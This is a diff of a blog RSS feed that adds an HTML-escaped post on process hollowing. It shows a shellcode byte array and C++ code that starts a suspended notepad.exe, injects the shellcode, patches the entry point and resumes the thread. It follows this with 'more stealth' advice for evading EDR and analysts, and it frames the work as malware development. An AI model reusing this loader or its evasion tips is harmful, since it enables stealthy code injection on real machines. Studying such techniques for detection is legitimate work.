+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xe6\x56\xff\x55\x04\x89\xc2\x50\xbb\xa8\xa2\x4d\xbc\x87\x1c&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x24\x52\xe8\x5f\xff\xff\xff\x68\x6f\x78\x58\x20\x68\x61\x67&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x65\x42\x68\x4d\x65\x73\x73\x31\xdb\x88\x5c\x24\x0a\x89\xe3&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x6b\x74\x58\x20\x68\x74\x20\x72\x65\x68\x45\x3d\x67\x65&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x68\x54\x49\x54\x4c\x68\x72\x65\x6b\x74\x68\x67\x65\x74\x20&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x31\xc9\x88\x4c\x24\x16\x89\xe1\x31\xd2\x52\x53\x51\x52\xff&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\xd0\x31\xc0\x50\xff\x55\x08&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+
+    HOST&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; hostProcess &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; HOST();
+    LPSTARTUPINFOA si &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; STARTUPINFOA();
+    LPPROCESS_INFORMATION pi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_INFORMATION();
+    PROCESS_BASIC_INFORMATION&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pbi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; PROCESS_BASIC_INFORMATION();
+    DWORD returnLength &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    CONTEXT ctx;
+
+    SHELLCODE&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; SHELLCODE();
+    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; buf;
+    s&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;shellcodeSize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(buf);
+        
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (CreateProcessA(
+        &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;, 
+        (LPSTR)&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Windows&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;System32&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;notepad.exe&amp;#34;&lt;/span&gt;,
+        NULL, NULL, TRUE, 
+        CREATE_SUSPENDED &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; CREATE_NO_WINDOW, 
+        NULL, NULL, si, pi) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; FALSE)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[x]Failed to execute notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; FALSE;
+    }
+    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!]Executed notepad.exe&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+
+    hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hProcess;
+    ctx.ContextFlags &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; CONTEXT_FULL;
+    fNtGetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);
+
+    NtQueryInformationProcess(
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        ProcessBasicInformation, 
+        pbi,
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(PROCESS_BASIC_INFORMATION), 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;returnLength);
+    DWORD pebImageBaseOffset &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (DWORD)pbi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;PebBaseAddress &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8&lt;/span&gt;;
+
+    SIZE_T bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;ReadProcessMemory(
+        hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;processHandle, 
+        (LPCVOID)pebImageBaseOffset, 
+        &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;hostProcess&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;imageBaseAddress,
+        &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;bytesRead) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; bytesRead &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed to read image base address&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;endl;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    }
+
+    PVOID remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; InjectShellcode(hostProcess, s);
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (remoteShellcodeAddress &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;shellcode injection failed&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;; 
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    }
+   
+    PVOID addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((addr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PatchHostProcess(hostProcess, remoteShellcodeAddress)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
+    {
+        std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;failed tp patch host&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
+    } 
+
+    fNtSetContextThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;ctx);
+
+    std&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;cout &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[!] Resumed thread&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
+    ResumeThread(pi&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;hThread);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Above code does exactly what is listed above. First, it starts a notepad
+process suspend it&amp;rsquo;s exution. then it retrieves &lt;strong&gt;thread context&lt;/strong&gt; from theprocess. Thread context is important because, without setting context back
+to what it was before suspending will cause a program crash.&lt;/p&gt;
+&lt;p&gt;Then it proceed to retrieve &lt;strong&gt;ImageBaseAddress&lt;/strong&gt; of the process using
+&lt;code&gt;NtQueryInformationProcess&lt;/code&gt; and &lt;code&gt;ReadProcessMemory&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Then the shellcode is injected into the target process by the function
+&lt;strong&gt;InjectShellcode&lt;/strong&gt;. This function uses the same technique discussed
+arlier.&lt;/p&gt;
+&lt;p&gt;The main function then calls &lt;strong&gt;PatchHostProcess&lt;/strong&gt;. This function reads the
+host process&amp;rsquo;s image into the memory and parses the entry point. Then in
+the local copy, it creates a hook that jumps into the shellcode that
+&lt;strong&gt;InjectShellcode&lt;/strong&gt; injected. Then it uses the above code injection method
+and creates a section in the local process, however, before creating a
+section in the remote process, it unmaps the process image using a call to
+&lt;code&gt;ZwUnmapViewOfSection&lt;/code&gt;. it then creates the section at the same address
+that the original image was mapped.&lt;/p&gt;
+&lt;p&gt;Its worth noting that it is possible to hook any address of the process
+image as long as it does not spawn notepad (or whatever).&lt;/p&gt;
+&lt;p&gt;Result after compiling and running the code&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/4.png&#34; alt=&#34;result&#34;&gt;&lt;/p&gt;
+&lt;p&gt;permissions of the shellcode&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/5.png&#34; alt=&#34;shellcode&amp;rsquo;s permissions&#34;&gt;&lt;/p&gt;
+&lt;p&gt;permissions of the original notepad image&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://rxOred.github.io/img/process-hollowing/6.png&#34; alt=&#34;notepad image&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;more-stealth&#34;&gt;More stealth&lt;/h2&gt;
+&lt;p&gt;Even though the technique is capable of fooling both analysts and some EDR,it can be stll detected if defense solutions are monitoring
+&lt;code&gt;CreateProcessA&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;There are many workarounds for this. One can directly call
+&lt;code&gt;NtCreateUserProcess&lt;/code&gt; or &lt;code&gt;NtCreateProcessEx&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Another method is to Hook one of those APIs and call &lt;code&gt;CreateProcessA&lt;/code&gt; with
+false arguments. For
+example,&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;- Hook `NtCreateUserProcess` so it will jump into a specified location
+- Call CreateProcessA without `CREATE_SUSPENDED` flag.
+- Set `CREATE_SUSPENDED` flag and jump back to `NtCreateUserProcess`
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The other thing to consider is changing the memory permissions of the
+target process after remapping. Even without doing that, it can mislead
+an analyst to beleive it as the malicious binary since it has permissions
+&lt;strong&gt;RWX&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Even after that, once analyst has dumped the original executable image
+thinking it is malicous to analyze it, it is pretty easy to indeify the
+hook. As stated earlier, it is possible hook any other location as long as
+it does not start the original process.&lt;/p&gt;
+&lt;p&gt;It is also possible to implement other instructions to change the control
+flow. For example, &lt;code&gt;push / ret&lt;/code&gt;.&lt;/p&gt;
+&lt;h1 id=&#34;references&#34;&gt;References&lt;/h1&gt;
+&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/hollowfind/&#34;&gt;hollowfind volatility plugin&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://cysinfo.com/detecting-deceptive-hollowing-techniques/&#34;&gt;DETECTING DECEPTIVE PROCESS HOLLOWING TECHNIQUES USING HOLLOWFIND VOLATILITY PLUGIN&lt;/a&gt;&lt;/p&gt;
+&lt;h1 id=&#34;the-end&#34;&gt;The end&lt;/h1&gt;
+&lt;p&gt;This blog post explored the concept of section mapping and how it can be
+leveraged when developing malware.&lt;/p&gt;
+&lt;p&gt;#Spread Anarchy!&lt;/p&gt;
+</content>
+    </item>
+    
     <item>
       <title>Reversing Anubis</title>
       <link>https://rxOred.github.io/post/analysis/anubis/anubis/</link>
